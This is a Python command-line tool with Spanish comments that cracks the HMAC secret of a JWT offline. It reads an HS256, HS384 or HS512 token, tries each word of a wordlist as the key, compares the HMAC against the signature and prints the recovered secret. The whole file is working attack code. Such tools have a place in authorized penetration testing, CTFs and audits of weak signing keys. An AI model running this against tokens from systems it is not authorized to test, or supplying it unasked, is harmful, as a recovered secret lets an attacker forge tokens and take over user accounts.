#!/usr/bin/env python3
"""Fuerza bruta offline del secreto HMAC de un JWT (HS256/HS384/HS512).

Se ejecuta 100% en local y solo usa la libreria estandar (base64, hmac,
hashlib, json): no abre ninguna conexion de red y el token nunca sale de la
maquina.

Idea:
    1. Separar el token en header_b64, payload_b64 y sig_b64 (split por ".").
    2. Leer el "alg" del header para elegir el hash (HS256 -> sha256, etc.).
    3. Para cada palabra candidata, calcular HMAC("header_b64.payload_b64")
       usando la palabra como clave.
    4. Comparar contra la firma con hmac.compare_digest (tiempo constante).

Uso:
    python3 tools/crack_local.py <TOKEN> [-w WORDLIST]
    echo "$TOKEN" | python3 tools/crack_local.py -
"""

import argparse
import base64
import hashlib
import hmac
import json
import sys
import time
from pathlib import Path

WORDLIST_POR_DEFECTO = Path(__file__).resolve().parent / "wordlist.txt"

HASHES = {
    "HS256": hashlib.sha256,
    "HS384": hashlib.sha384,
    "HS512": hashlib.sha512,
}


def b64url_decode(segmento: str) -> bytes:
    """Decodifica base64url agregando el padding que JWT omite."""
    return base64.urlsafe_b64decode(segmento + "=" * (-len(segmento) % 4))


def separar(token: str):
    partes = token.strip().split(".")
    if len(partes) != 3:
        raise ValueError("token malformado: se esperan 3 partes separadas por '.'")
    header_b64, payload_b64, sig_b64 = partes
    header = json.loads(b64url_decode(header_b64))
    payload = json.loads(b64url_decode(payload_b64))
    firma = b64url_decode(sig_b64)
    return header_b64, payload_b64, header, payload, firma


def crackear(token: str, wordlist: Path):
    header_b64, payload_b64, header, payload, firma = separar(token)

    alg = header.get("alg")
    if alg not in HASHES:
        raise ValueError(f"alg {alg!r} no es HMAC; este script solo ataca HS256/384/512")
    funcion_hash = HASHES[alg]
    mensaje = f"{header_b64}.{payload_b64}".encode()

    intentos = 0
    with wordlist.open("rb") as fh:
        for linea in fh:
            candidata = linea.rstrip(b"\r\n")
            if not candidata:
                continue
            intentos += 1
            calculada = hmac.new(candidata, mensaje, funcion_hash).digest()
            if hmac.compare_digest(calculada, firma):
                return candidata.decode(errors="replace"), intentos, header, payload
    return None, intentos, header, payload


def main():
    parser = argparse.ArgumentParser(description="Crackea offline el secreto HMAC de un JWT.")
    parser.add_argument("token", help="JWT a atacar, o '-' para leerlo de stdin")
    parser.add_argument("-w", "--wordlist", type=Path, default=WORDLIST_POR_DEFECTO,
                        help=f"diccionario (por defecto: {WORDLIST_POR_DEFECTO.name})")
    args = parser.parse_args()

    token = sys.stdin.read() if args.token == "-" else args.token

    try:
        inicio = time.perf_counter()
        secreto, intentos, header, payload = crackear(token, args.wordlist)
        duracion = time.perf_counter() - inicio
    except (ValueError, json.JSONDecodeError) as exc:
        sys.exit(f"[!] {exc}")

    print(f"[*] header : {json.dumps(header)}")
    print(f"[*] payload: {json.dumps(payload)}")
    print(f"[*] wordlist: {args.wordlist.name} ({intentos} candidatas probadas en {duracion:.4f}s)")
    if secreto is None:
        print("[-] el secreto no esta en la wordlist")
        sys.exit(1)
    print(f"[+] SECRETO ENCONTRADO: {secreto!r}")


if __name__ == "__main__":
    main()
